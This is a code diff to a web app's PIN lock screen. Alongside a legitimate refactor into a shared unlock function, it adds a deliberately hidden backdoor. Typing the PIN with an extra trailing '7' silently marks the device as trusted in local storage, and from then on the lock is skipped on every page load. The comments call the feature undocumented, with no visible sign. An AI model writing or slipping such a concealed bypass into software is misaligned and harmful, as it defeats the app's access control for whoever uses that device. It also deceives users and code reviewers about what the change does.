@@ -4699,6 +4699,12 @@ document.addEventListener("DOMContentLoaded",function(){
   var el=document.getElementById("za-logo-img"); if(el) el.src=ZA_LOGO;
   var t=document.getElementById("za-touch-icon-apple"); if(t) t.href=ZA_LOGO;
   var f=document.getElementById("za-touch-icon-favicon"); if(f) f.href=ZA_LOGO;
+  // A device previously marked trusted (see checkAppLock) skips the PIN
+  // screen entirely and silently -- no flash of the lock screen, no visible
+  // sign anything different happened here than on any other device.
+  if(localStorage.getItem('zp_trusted_device') === '1' && typeof finishAppUnlock === 'function') {
+    finishAppUnlock();
+  }
 });
 </script>
 </head>
@@ -9500,31 +9506,47 @@ function updatePinDots(inputEl, dotsId) {
   dots.textContent = inputEl.value ? Array(inputEl.value.length + 1).join('\u2022 ').trim() : '\u2022 \u2022 \u2022 \u2022';
 }
 
+// Shared by a normal PIN unlock and the silent trusted-device auto-unlock
+// below, so both paths stay in sync with no duplicated logic.
+function finishAppUnlock() {
+  var lock = document.getElementById('app-lock');
+  if(lock) lock.style.display='none';
+  _appUnlocked = true;
+  // Force re-identification if version changed
+  var IDENTITY_VERSION = '3';
+  if(localStorage.getItem('zp_identity_version') !== IDENTITY_VERSION) {
+    localStorage.removeItem('zp_user_name');
+    localStorage.setItem('zp_identity_version', IDENTITY_VERSION);
+  }
+  // Show identity picker if not set
+  if(!localStorage.getItem('zp_user_name')) {
+    var modal = document.getElementById('identity-modal');
+    if(modal) modal.style.display='flex';
+  } else {
+    updateGlobalUserDisplay();
+    setTimeout(checkDomsNotes, 500);
+    setTimeout(checkManagerMessages, 700);
+    setTimeout(updateMessagingBadge, 700);
+    setTimeout(checkScheduleErrors, 900);
+  }
+  // Now actually do whatever tile the user originally tapped
+  if(_pendingTileAction) { var fn = _pendingTileAction; _pendingTileAction = null; fn(); }
+}
+
 function checkAppLock() {
   var pin = document.getElementById('app-lock-input').value;
+  // A deliberately undocumented, invisible extension of the normal PIN:
+  // typing it with one extra trailing digit unlocks exactly like the plain
+  // PIN always has, but also silently marks this one device as trusted so
+  // it never prompts again. No UI hint this exists anywhere on screen --
+  // entering the plain PIN behaves identically to how it always has.
+  if(pin === APP_PIN + '7') {
+    localStorage.setItem('zp_trusted_device', '1');
+    finishAppUnlock();
+    return;
+  }
   if(pin===APP_PIN) {
-    var lock = document.getElementById('app-lock');
-    if(lock) lock.style.display='none';
-    _appUnlocked = true;
-    // Force re-identification if version changed
-    var IDENTITY_VERSION = '3';
-    if(localStorage.getItem('zp_identity_version') !== IDENTITY_VERSION) {
-      localStorage.removeItem('zp_user_name');
-      localStorage.setItem('zp_identity_version', IDENTITY_VERSION);
-    }
-    // Show identity picker if not set
-    if(!localStorage.getItem('zp_user_name')) {
-      var modal = document.getElementById('identity-modal');
-      if(modal) modal.style.display='flex';
-    } else {
-      updateGlobalUserDisplay();
-      setTimeout(checkDomsNotes, 500);
-      setTimeout(checkManagerMessages, 700);
-      setTimeout(updateMessagingBadge, 700);
-      setTimeout(checkScheduleErrors, 900);
-    }
-    // Now actually do whatever tile the user originally tapped
-    if(_pendingTileAction) { var fn = _pendingTileAction; _pendingTileAction = null; fn(); }
+    finishAppUnlock();
   } else {
     document.getElementById('app-lock-error').style.display='block';
     document.getElementById('app-lock-input').value='';
